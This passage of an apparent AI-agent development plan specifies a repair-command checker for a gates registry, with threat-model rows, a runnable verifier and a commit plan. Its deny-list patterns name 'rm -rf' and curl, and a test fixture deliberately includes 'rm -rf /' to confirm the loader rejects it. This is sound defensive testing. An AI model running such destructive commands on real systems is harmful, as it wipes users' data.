| T-33-09 | Tampering (regex bypass) | `repair_command: "RM -RF /"` (uppercase) bypasses `\brm\s+-r?f\b` | accept | DENYLIST regexes are case-insensitive on the relevant patterns (e.g. `\bcurl\b/i`); the `\brm\s+-r?f\b` pattern omits /i because shell `RM` is not a real binary on POSIX/Windows; if proven wrong, follow-up commit adds /i. Confidence: HIGH (no shell on either OS resolves uppercase RM as /bin/rm). |
| T-33-10 | Information Disclosure (log) | rejected command text echoed to console.warn could leak embedded secrets | accept | The deny-lists explicitly reject env-var-bearing commands BEFORE the rejection-message is built; commands that pass auth-free check do not contain secrets. Stderr-only logging matches route-ledger.cjs precedent. |

All threats are tracked. Mitigated threats have a deterministic, in-phase
control. Accepted threats document why the residual risk is acceptable.
</threat_model>

<verification>
Phase 33 ships when all 4 REPAIR-01..04 checks pass deterministically
against the canonical `super-gsd/registry/gates.yaml` and the new
`super-gsd/scripts/lib/repair-command-checker.cjs`.

Verifier (single block, runnable from repo root):

```bash
# REPAIR-01: 13 repair_instruction rows.
[ "$(grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml)" -ge 13 ] && echo "PASS REPAIR-01" || { echo "FAIL REPAIR-01"; exit 1; }

# REPAIR-02 + REPAIR-03 (combined: --self-test covers all 14 assertions
# including assertion 14 = canonical gates.yaml passes).
node super-gsd/scripts/lib/repair-command-checker.cjs --self-test

# REPAIR-03 (load-time gate -- separate from --self-test).
node -e "
  const fs=require('fs'), path=require('path'), os=require('os');
  const tmp=fs.mkdtempSync(path.join(os.tmpdir(),'r3-'));
  fs.writeFileSync(path.join(tmp,'g.yaml'),
    'gates:\n  - name: bad\n    enforcement_mode: hard-halt\n    repair_instruction: \"x\"\n    repair_command: \"rm -rf /\"\n');
  const gr=require('./super-gsd/scripts/lib/gates-registry.cjs');
  gr.resetCache();
  let threw=false;
  try { gr.loadGates(path.join(tmp,'g.yaml')); }
  catch(e) { threw = /4-AND/.test(e.message) && /bad/.test(e.message); }
  fs.rmSync(tmp,{recursive:true,force:true});
  process.exit(threw ? 0 : 1);
"

# REPAIR-04 (surfacing -- presence checks, not runtime smoke).
grep -q 'repair-command-checker.cjs' super-gsd/scripts/lib/sgsd-mission-strip.ps1 && echo "PASS REPAIR-04 (Mission Strip)" || { echo "FAIL REPAIR-04 (Mission Strip)"; exit 1; }
grep -q 'Unresolved Repairs' super-gsd/skills/sgsd-complete-milestone/SKILL.md && echo "PASS REPAIR-04 (milestone close)" || { echo "FAIL REPAIR-04 (milestone close)"; exit 1; }
```

The full verifier (T7's expanded form) writes
`.planning/milestones/v1.7/phases/33-repair-instruction/33-VERIFICATION.md`
with the captured stdout and the A2-demotion explanatory paragraph.
</verification>

<success_criteria>
Phase 33 succeeds when ALL of the following hold simultaneously:

1. **REPAIR-01**: `super-gsd/registry/gates.yaml` has at least 13 lines
   matching `^    repair_instruction:` (one per gate row).

2. **REPAIR-02**: Exactly 2 lines matching `^    repair_command:` exist
   (after A2 demotion of sgsd-recall-queries and token-log). Both
   commands pass `validateOneCommand` with `ok: true`.

3. **REPAIR-03**: `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test`
   exits 0 with "14 pass, 0 fail" + fingerprint guard PASS. The
   load-time wire-in at `gates-registry.cjs:53` throws a structured
   error (containing '4-AND', the gate name, and the failed predicate)
   when given a yaml fixture with `repair_command: "rm -rf /"`.
   Canonical `gates.yaml` continues to load cleanly.

4. **REPAIR-04**: `super-gsd/scripts/lib/sgsd-mission-strip.ps1`
   references `repair-command-checker.cjs` and the blocker line
   construction includes the `| repair: $repairShort` suffix.
   `super-gsd/skills/sgsd-complete-milestone/SKILL.md` contains
   `## Unresolved Repairs` section template AND cites
   `unresolvedRepairsForMilestone` helper.

5. **Schema-without-consumer rule**: every schema element ships an
   in-phase consumer:
   - `repair_instruction:` (config) -> consumed by gates-registry's
     `assertEveryBlockingGateHasInstruction` (load-time soft warn) +
     Mission Strip Q4 (cockpit) + milestone-close SUMMARY
   - `repair_command:` (config) -> consumed by validateRepairCommands
     (load-time hard throw)
   - 4-AND predicate (lib) -> consumed by gates-registry::loadGates

6. **Live-or-local**: all verifier checks run against real shipped
   files (gates.yaml + checker + registry + mission strip + SKILL.md)
   PLUS a single tmpdir fixture for the poison-yaml load test. No
   external deps. No network. No auth.

7. **A2 demotion documented**: `33-VERIFICATION.md` explains why 2
   of the 4 RESEARCH-3 candidates were demoted (sgsd-recall.sh has
   no --self-test/--dry-run flag; tools/token-audit/check.cjs does
   not exist), citing the verification commands run in this plan.

8. **7 atomic commits**: one per task, message format
   `feat(33-01): ...` for code/config, `docs(33-01): ...` for SKILL.md,
   `test(33-01): ...` for the verifier capture.
</success_criteria>

<commit_plan>
7 atomic commits. One per task. Stage by name; never `git add -A`.

```bash
# Commit 1 (T1)
git add super-gsd/registry/gates.yaml
git commit -m "feat(33-01): add repair_instruction text to all 13 gates"

# Commit 2 (T2)
git add super-gsd/registry/gates.yaml
git commit -m "feat(33-01): add repair_command to 2 gates passing 26.3 4-AND predicate (after A2 demotion of recall+token-log)"

# Commit 3 (T3)
git add super-gsd/scripts/lib/repair-command-checker.cjs
git commit -m "feat(33-01): repair-command-checker.cjs lib + 14-assertion self-test"

# Commit 4 (T4)
git add super-gsd/scripts/lib/gates-registry.cjs
git commit -m "feat(33-01): wire load-time validateRepairCommands into gates-registry.cjs"

# Commit 5 (T5)
git add super-gsd/scripts/lib/sgsd-mission-strip.ps1
git commit -m "feat(33-01): Mission Strip Q4 surfaces repair_instruction text"

# Commit 6 (T6)
git add super-gsd/skills/sgsd-complete-milestone/SKILL.md
git commit -m "docs(33-01): milestone close SUMMARY enumerates unresolved repairs"

# Commit 7 (T7)
git add .planning/milestones/v1.7/phases/33-repair-instruction/33-VERIFICATION.md
git commit -m "test(33-01): verifier embeds REPAIR-01..04 runnable checks"
```

Each commit must independently pass `--self-test` (commits 3+) or leave
the repo in a state where `--self-test` would still pass after a hot
reload (commits 1, 2, 4, 5, 6 do not change the lib's behavior; commit
1 + 2 introduce values the lib then validates at commit 4's load-time
hookup -- but assertion 14 already runs against canonical gates.yaml,
so the order matters: T3 must land before T4).

Recommended commit order respecting that constraint:
  T1 -> T2 -> T3 -> T4 -> T5 -> T6 -> T7
This is the order written above. T3's --self-test runs against the
canonical yaml that already has T1+T2 edits applied, so all 14
assertions pass at the T3 commit boundary. T4's load-time integration
then references the now-existing checker module.
</commit_plan>

<output>
After completion, create
`.planning/milestones/v1.7/phases/33-repair-instruction/33-01-SUMMARY.md`
following `~/.claude/get-shit-done/templates/summary.md`.

The SUMMARY must include:
- frontmatter: phase=33, plan=01, status=PASS|WARN|FAIL
- shipped artifacts (5 files: gates.yaml + 4 modifications + 1 NEW lib)
- evidence: VERIFICATION.md path
- A2 demotion note (sgsd-recall + token-log demoted to instruction-only)
- next-phase hook: phase 34 (LEDGER) is independent; phase 35 (MAP) consumes
  the new repair_instruction/repair_command schema in its system map output

Phase 33 is parallel-eligible with Phase 34 (no file overlap; both depend on
Phase 31's envelope schema only).
</output>
